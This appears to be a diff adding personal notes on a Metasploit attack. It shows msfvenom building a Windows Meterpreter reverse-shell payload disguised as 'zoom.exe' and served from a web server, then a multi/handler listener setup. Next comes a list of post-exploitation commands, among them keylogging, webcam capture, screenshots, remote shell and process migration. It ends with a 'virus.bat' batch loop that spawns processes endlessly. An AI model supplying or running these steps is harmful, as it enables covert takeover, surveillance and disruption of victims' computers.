@@ -1,0 +1,60 @@
+payload
+
+msfvenom -p windows/meterpreter/reverse_tcp lhost=<IP> lport=8000 -f exe -o zoom.exe
+
+cp zoom.exe /var/www/html
+
+service apache2 start
+-----------------------------------
+
+msfconsole
+
+
+use multi/handler
+
+set payload windows/meterpreter/reverse_tcp
+
+set lhost 192.168.163.133
+
+set lport 8000
+
+exploit     
+---------------
+
+
+1)mkdir test
+
+2)download/upload read file using CAT (upload /home/kali/Desktop/file.txt)
+
+3)execute -f <file_name> ex : cmd,notepad
+
+4)keylogger (keyborad_send "text")
+  *keyscan_start
+  *keyscan_dump
+
+5)web_camera
+
+6)sysinfo(*shutdown,*restart)
+
+7)shell(win cmd)
+
+8)screenshot(RUN VNC)
+
+9)uictl(user interface ctrl keyboard/mouse)
+
+10)ps(background process) 11 run vnc 12)migrate
+
+
+----------------------------------------------------
+-----------------------------------------------------
+
+virus.bat
+
+:A
+start %random% %random% %random% %random%
+goto A
+-------------------------------------------------
+
+
+
+
